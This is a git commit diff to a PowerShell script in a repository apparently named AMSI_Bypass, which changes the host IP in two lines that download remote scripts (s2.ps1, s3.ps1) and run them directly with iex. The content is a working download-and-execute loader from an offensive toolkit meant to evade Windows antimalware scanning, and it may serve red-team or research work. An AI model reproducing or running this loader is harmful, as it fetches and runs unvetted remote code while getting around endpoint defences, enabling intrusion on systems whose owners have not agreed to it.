5afd7b06d4b17ccba3c7ef2d48ba9a729bd947ac
hodorsec <hodorsec@protonmail.com>
2022-02-02 22:47:00 +0100

    Recompiled for C# .NET 4.0

--- AMSI_Bypass/PSScripts/Examples/s1.ps1
+++ AMSI_Bypass/PSScripts/Examples/s1.ps1
@@ -1,7 +1,7 @@
 function load_init
 {
-	iex(new-object net.webclient).downloadString('http://192.168.252.5/s2.ps1')
-	iex(new-object net.webclient).downloadString('http://192.168.252.5/s3.ps1')
+	iex(new-object net.webclient).downloadString('http://10.0.2.10/s2.ps1')
+	iex(new-object net.webclient).downloadString('http://10.0.2.10/s3.ps1')
 }
 load_init
 
